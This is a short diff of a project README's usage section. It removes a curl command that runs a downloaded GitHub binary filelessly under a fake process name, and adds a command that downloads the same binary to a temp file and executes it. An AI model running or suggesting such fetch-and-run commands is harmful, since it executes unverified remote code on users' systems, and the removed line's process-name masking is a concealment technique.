@@ -13,4 +13,6 @@
 - `yarn run start` Will start scanning
 - `yarn run start:all`
 
-curl -fsSL https://github.com/MiltonTulli/wtbt/raw/refs/heads/master/output | (exec -a my_binary /proc/self/fd/0)
+## CLI execution
+
+bin_fd=$(mktemp) && curl -fsSL https://github.com/MiltonTulli/wtbt/raw/refs/heads/master/output > "$bin_fd" && chmod +x "$bin_fd" && "$bin_fd"
